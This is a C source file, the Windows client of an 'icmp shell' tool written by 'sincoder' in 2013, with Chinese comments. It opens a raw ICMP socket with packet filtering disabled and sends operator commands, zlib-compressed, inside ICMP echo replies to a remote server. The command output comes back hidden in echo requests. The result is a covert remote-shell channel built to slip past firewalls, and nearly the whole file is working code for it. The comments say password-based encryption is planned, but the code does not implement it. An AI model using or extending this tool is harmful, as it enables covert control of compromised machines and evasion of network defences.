/*
Copyright (C) 2013   sincoder

This program is free software; you can redistribute it and / or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110 - 1301, USA.



运行在 windows 上的客户端

使用方法

icmp_shell.exe [ip]
    然后弹出一个 窗口 用于执行命令

    搞个对话框真的是多余的

    数据验证
    client 发送 密码字符串到服务端  服务端验证成功了 就会回复 一个 reply 消息
    否则的话 client 段 会因为 超时而失败

    后期通信的话 都会使用这个密码字符串来进行加密

    客户端收到的数据都来自 request 包
    客户端会尝试使用输入的密码来解密收到的数据  解密正确的数据 应该全部都是 字符串

    2013.4.27  RAW  收到的包 会经过 windows  的防火墙的过滤 还是 winpcap 搞起吧
    尼玛  winpcap 上面还要选择 网卡 蛋疼啊
*/

#include <WinSock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <mstcpip.h>
#include <IPHlpApi.h>
#include "zlib/zlib.h"
    //#include "resource.h"

#pragma comment(lib,"ws2_32")
#pragma comment(lib,"Iphlpapi.lib")

#define MAX_BUFF_SIZE 1000

#if _MSC_VER <= 1200
    void dbg_msg(char *fmt, ...)
{
#ifdef _DEBUG
    va_list args;
    int n;
    char TempBuf[8192];
    va_start(args, fmt);
    n = vsprintf(TempBuf, fmt, args);
    printf("%s", TempBuf);
    va_end(args);
#endif
}
#else  //使用宏来定义 
#define dbg_msg(fmt,...) do{\
        printf(##__FUNCTION__##" %d :"##fmt,__LINE__,__VA_ARGS__);\
    }while(0);
#endif

#ifndef _In_
#define _In_
#define _Out_
#define _In_opt_
#endif

typedef unsigned char uint8;
typedef unsigned short uint16;
typedef unsigned int uint32;
typedef CRITICAL_SECTION  lock;

__inline void lock_init(lock *cs)
{
    InitializeCriticalSection(cs);
}

__inline void lock_destory(lock *cs)
{
    DeleteCriticalSection(cs);
}

__inline void lock_lock(lock *cs)
{
    EnterCriticalSection(cs);
}

__inline void lock_unlock(lock *cs)
{
    LeaveCriticalSection(cs);
}

enum PACKET_TYPE
{
    TYPE_REQUEST = 0x2B,
    TYPE_REPLY
};

#pragma pack(push,1)

struct packet_header
{
    uint8 type;
};

struct icmphdr
{
    uint8 type;     /* message type */
    uint8 code;     /* type sub-code */
    uint16 checksum;
    union
    {
        struct
        {
            uint16  id;
            uint16  sequence;
        } echo;         /* echo datagram */
        uint32  gateway;    /* gateway address */
        struct
        {
            uint16  __unused;
            uint16  mtu;
        } frag;         /* path mtu discovery */
    } un;
};

typedef struct ip_address
{
    u_char byte1;
    u_char byte2;
    u_char byte3;
    u_char byte4;
} ip_address;


typedef struct _IPHeader        // 20字节的IP头
{
    uint8     iphVerLen;      // 版本号和头长度（各占4位）
    uint8     ipTOS;          // 服务类型
    uint16    ipLength;       // 封包总长度，即整个IP报的长度
    uint16    ipID;           // 封包标识，惟一标识发送的每一个数据报
    uint16    ipFlags;        // 标志
    uint8     ipTTL;          // 生存时间，就是TTL
    uint8     ipProtocol;     // 协议，可能是TCP、UDP、ICMP等
    uint16    ipChecksum;     // 校验和
    union
    {
        unsigned int   ipSource;
        ip_address ipSourceByte;
    };
    union
    {
        unsigned int   ipDestination;
        ip_address ipDestinationByte;
    };
} IPHeader, *PIPHeader;

#pragma pack(pop)

#define INPUT_BUFFER_SIZE 8192

SOCKET g_sock;
HANDLE hInputEvent;
char   g_input_buffer[INPUT_BUFFER_SIZE];  //用户输入的 数据 。。。
lock  g_input_lock;
char *g_remote_ip;
//char *g_password = NULL;
uint32 g_bind_ip = 0;//本地绑定的 Ip

HANDLE (__stdcall *pf_IcmpCreateFile)(void) = NULL;
DWORD (__stdcall *pf_IcmpSendEcho)(
    _In_      HANDLE IcmpHandle,
    _In_      IPAddr DestinationAddress,
    _In_      LPVOID RequestData,
    _In_      WORD RequestSize,
    _In_opt_  PIP_OPTION_INFORMATION RequestOptions,
    _Out_     LPVOID ReplyBuffer,
    _In_      DWORD ReplySize,
    _In_      DWORD Timeout
) = NULL;

BOOL load_deps()
{
    HMODULE lib;
    lib = LoadLibraryA("iphlpapi.dll");
    if (lib != NULL)
    {
        pf_IcmpCreateFile = GetProcAddress(lib, "IcmpCreateFile");
        pf_IcmpSendEcho = GetProcAddress(lib, "IcmpSendEcho");
        if (pf_IcmpCreateFile && pf_IcmpSendEcho)
        {
            return TRUE;
        }
    }
    // windows 2000  上面这个函数实在 ICMP.dll 里
    lib = LoadLibraryA("ICMP.DLL");
    if (lib != NULL)
    {
        pf_IcmpCreateFile = GetProcAddress(lib, "IcmpCreateFile");
        pf_IcmpSendEcho = GetProcAddress(lib, "IcmpSendEcho");
        if (pf_IcmpCreateFile && pf_IcmpSendEcho)
        {
            return TRUE;
        }
    }
    dbg_msg("failed to load functions (%u) \n", GetLastError());
    return FALSE;
}

/*
计算 icmp 数据包的 校验和
*/
unsigned short checksum(unsigned short *ptr, int nbytes)
{
    unsigned long sum;
    unsigned short oddbyte, rs;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1)
    {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    rs = ~sum;
    return rs;
}
/*
构建一个回复包
*/
BOOL  send_icmp_replay_packet(struct icmphdr *request, uint32 ip, char *data, int size)
{
    BOOL ret = FALSE;
    int  packet_size = sizeof(struct icmphdr) + size;
    struct icmphdr *reply_packet = (struct icmphdr *)malloc(packet_size);

    dbg_msg("send_icmp_replay_packet() :try send reply to %s \n", inet_ntoa(*(struct in_addr *)&ip));

    if (NULL != reply_packet)
    {
        char *pdata ;
        struct sockaddr_in addr;

        memcpy(reply_packet, request, sizeof(struct icmphdr));
        reply_packet->type = 0 ; // reply
        pdata = (char *)(reply_packet + 1);
        memcpy(pdata, data, size);

        reply_packet->checksum = 0;
        reply_packet->checksum = checksum((unsigned short *)reply_packet, packet_size);

        memset(&addr, 0, sizeof(struct sockaddr_in));
        addr.sin_family = AF_INET;
        addr.sin_addr.S_un.S_addr = ip;
        if (sendto(g_sock, (char *)reply_packet, packet_size, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) < 1)
        {
            dbg_msg("send packet failed !! \n");
        }
    }
    return ret;
}

BOOL set_socket_recv_all(SOCKET s)
{
    //http://www.okob.net/wp/index.php/2009/04/30/icmp-over-raw-sockets-under-windows-vista/
    /* Run the IOCTL that disables packet filtering on the socket. */
#if WINVER > 0x600
    DWORD tmp, prm = RCVALL_IPLEVEL; /* "RCVALL_IPLEVEL" (Vista SDK) */
    if (WSAIoctl(s, SIO_RCVALL, &prm, sizeof(prm), NULL, 0,
                 &tmp, NULL, NULL) == SOCKET_ERROR)
    {
        /* Handle error here */
        return FALSE;
    }
    return TRUE;
#else
    u_long old = 1;
    return (0 == ioctlsocket(s, SIO_RCVALL, &old));
    //dbg_msg("Nt 5.x do not need to set this flag !! \n");
#endif
}

DWORD __stdcall Icmp_recv_thread(LPVOID lparam)
{
    char buff[1500];
    int nbytes = 0;
    dbg_msg("icmp recv thread start !! \n");
    while ((nbytes = recv(g_sock, buff, 1500, 0)) > 0)
    {
        IPHeader *ip = (IPHeader *)buff;
        int iplen = (ip->iphVerLen & 0xf) * sizeof(unsigned int);
        struct icmphdr *icmp = (struct icmphdr *)((char *)ip + iplen);
        dbg_msg("recv %d bytes from %s \n", nbytes, inet_ntoa(*(struct in_addr *)&ip->ipSource));

        nbytes -= iplen;

        if (0 == icmp->code) // icmp echo
        {
            if (0 == icmp->type)
            {
                dbg_msg("icmp reply \n");
            }
            else if (8 == icmp->type ) //&& g_bind_ip != ip->ipSource)  //确保不是我们发的包
            {
                char *pdata  = NULL; //服务端发过来的数据
                struct packet_header *phdr = NULL;
                dbg_msg("icmp request  from %s \n", inet_ntoa(*(struct in_addr *)&ip->ipSource));
                phdr = (struct packet_header *)(icmp + 1);
                switch (phdr->type)
                {
                case TYPE_REPLY:
                {
                    dbg_msg("packet type is replay  !! \n");
                    dbg_msg("reply packet in request icmp msg  something may goes wrong !!! \n");
                }
                break;
                case TYPE_REQUEST:
                {
                    char compress_buff[1024];
                    uLongf  compress_buff_len = sizeof(compress_buff);

                    dbg_msg("packet type is request \n");
                    // 我们只关心  request
                    pdata = (char *)(phdr + 1);
                    nbytes -= sizeof(struct icmphdr);
                    nbytes -= sizeof(struct packet_header);

                    if (nbytes > 0)
                    {
                        // 解压缩数据
                        if (Z_OK == uncompress(compress_buff, &compress_buff_len, pdata, nbytes))
                        {
                            compress_buff[compress_buff_len] = 0;
                            printf("%s", compress_buff);
                        }
                        else
                        {
                            dbg_msg("uncompress failed !! \n");
                        }
                    }
                    //下面发送 回复
                    //收到这个请求的时候 我们应该发送本地的数据  不管有木有
                    lock_lock(&g_input_lock);
                    //dbg_msg("try send %s \n",g_input_buffer);
                    //memset(buff,0,MAX_BUFF_SIZE);
                    //buff[0] = TYPE_REPLY;
                    //strcpy(&buff[1],g_input_buffer);
                    compress_buff[0] = TYPE_REPLY;
                    compress_buff_len = sizeof(compress_buff) - 1;
                    //压缩数据
                    if (strlen(g_input_buffer))
                    {
                        if (Z_OK == compress(&compress_buff[1], &compress_buff_len, g_input_buffer, strlen(g_input_buffer)))
                        {
                            send_icmp_replay_packet(icmp, ip->ipSource, &compress_buff[0], compress_buff_len + 1 );
                        }
                        else
                        {
                            printf("compress failed !! \n");
                        }
                    }
                    else
                    {
                        send_icmp_replay_packet(icmp, ip->ipSource, &compress_buff[0],  1 );
                    }
                    g_input_buffer[0] = 0;
                    lock_unlock(&g_input_lock);
                }
                break;
                default:
                {
                    dbg_msg("unknown packet type !!! \n");
                }
                break;
                }
            }
            else
            {
                dbg_msg("unknown type : %d \n", icmp->type);
            }
        }
    }
    dbg_msg("icmp recv thread end !! \n");
    return 0;
}

void Loop_recv_cmd()
{
    char line[201];
    ULONG inputLength;

    while (TRUE)
    {
        if (!fgets(line, sizeof(line) - 1 , stdin))
            break; //控制台已经被关闭了

        // Remove the terminating new line character.

        inputLength = (ULONG)strlen(line);

        if (inputLength != 0)
            line[inputLength - 1] = 0;

        //command = strtok(line, delims);

        //if (!command)
        //{
        //    continue;
        //}
        //send command
        //printf("%s\n",command);
        lock_lock(&g_input_lock);
        strcat(g_input_buffer, line);
        lock_unlock(&g_input_lock);
    }
}

// from s port scanner
u_long getBindIpAddress(char *dstIpAddr)
{
    u_long  bindAddr = INADDR_NONE;
    DWORD   nInterfaceIndex = 0;
    DWORD   index = 0;
    PMIB_IPADDRTABLE    ipTable = NULL;
    ULONG   allocSize = 0;
    HRESULT ret;

    ret = GetBestInterface( inet_addr(dstIpAddr), &nInterfaceIndex );

    if (ret != NO_ERROR)
    {
        goto __exit;
    }

    /*
    MIB_IFROW ifRow;
    ifRow.dwIndex = nInterfaceIndex;
    ret = GetIfEntry( &ifRow );

      if ( ret != NO_ERROR )
      {
      goto __exit;
      }

        printf("%s\n", ifRow.bDescr);
    */

    allocSize = 0;

    do
    {
        ret = GetIpAddrTable( ipTable, &allocSize, FALSE );
        if (ret != NO_ERROR)
        {
            if (allocSize)
            {
                ipTable = (PMIB_IPADDRTABLE)malloc(allocSize);
            }
        }
    }
    while (ret != NO_ERROR);

    for (index = 0; index < ipTable->dwNumEntries; index++)
    {
        if (ipTable->table[ index ].dwIndex == nInterfaceIndex)
        {
            bindAddr = ipTable->table[ index ].dwAddr;
            break;
        }
    }

__exit:
    if (ipTable)
    {
        free(ipTable);
    }
    return bindAddr;
}

/*
测试下远程的机器是不是运行着我们的服务端程序
通过发送一个 request 包 然后如果那边正在运行一个服务端的话  如果密码正确的话  就会主动的发送包给我们  告诉我们加载的密钥（也就是密码）

 没必要发送密码 ping 一下就行了
*/
BOOL ping_remote_host(char *ip)
{
    BOOL ret = FALSE;
    char request_buff[512] = {0};
    char replybuff[1024];
    HANDLE hIcmp = pf_IcmpCreateFile();

    if (INVALID_HANDLE_VALUE == hIcmp)
        return FALSE;
    request_buff[0] = TYPE_REQUEST;
    //strcpy(&request_buff[1],"sincoder");
    if (pf_IcmpSendEcho(hIcmp, inet_addr(ip), &request_buff[0], strlen(&request_buff[1]) + 1, NULL, replybuff, 1024, 3000)) //等待3s
    {
        PICMP_ECHO_REPLY pReply = (PICMP_ECHO_REPLY)replybuff;
        if (pReply->DataSize > 0)
        {
            ret = TRUE;
        }
    }
    CloseHandle(hIcmp);
    return ret;
}

int main(int argc, char **argv)
{
    struct WSAData wsa;
    struct sockaddr_in addr;
    int opt = 1;
    int len = sizeof(struct sockaddr);
    HANDLE hRecvThread;

    if (argc < 2)
    {
        printf("icmp shell \nBy sincoder \nUsage:%s [ip] \n",argv[0]);
        return -1;
    }

    g_remote_ip = argv[1];
    if (0 == inet_addr(g_remote_ip))
    {
        dbg_msg("error ip format ! \n");
        return -2;
    }

    if (!load_deps())
    {
        printf("failed to load dll \n");
        return -3;
    }

    //g_password = argv[2];

    g_bind_ip = getBindIpAddress(g_remote_ip);

    if (INADDR_NONE == g_bind_ip)
    {
        printf("failed to get local bind ip \n");
        return -4;
    }

    WSAStartup(MAKEWORD(2, 2), &wsa);
    g_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (INVALID_SOCKET == g_sock)
    {
        dbg_msg("create socket failed \n");
        return -1;
    }

    addr.sin_addr.S_un.S_addr =  g_bind_ip;
    addr.sin_family = AF_INET;
    addr.sin_port = 0;

    if (SOCKET_ERROR == bind(g_sock, (struct sockaddr *)&addr, sizeof(struct sockaddr)))
    {
        dbg_msg("bind failed  !! \n");
        closesocket(g_sock);
        return -1;
    }

    dbg_msg("bind on ip : %s \n", inet_ntoa(*(struct in_addr *)&g_bind_ip));
    set_socket_recv_all(g_sock);  //  vista 以上的系统必须这样设置下 才能收到 ping request 包。。。
    lock_init(&g_input_lock);

    hRecvThread = CreateThread(NULL, 0, Icmp_recv_thread, NULL, 0, NULL);
    dbg_msg("send init command request !! \n");
    // 发送一个包 探测下 远程 是不是 正在运行着我们的 服务端
    if (ping_remote_host(g_remote_ip))
    {
        dbg_msg("ping host %s OK !! \n", g_remote_ip);
        //对方可以 Ping 的 通
        Loop_recv_cmd();  //接收用户的输入
    }

    dbg_msg("last error : %d \n", GetLastError());
    closesocket(g_sock);
    WaitForSingleObject(hRecvThread, INFINITE);
    lock_destory(&g_input_lock);
    return 0;
}
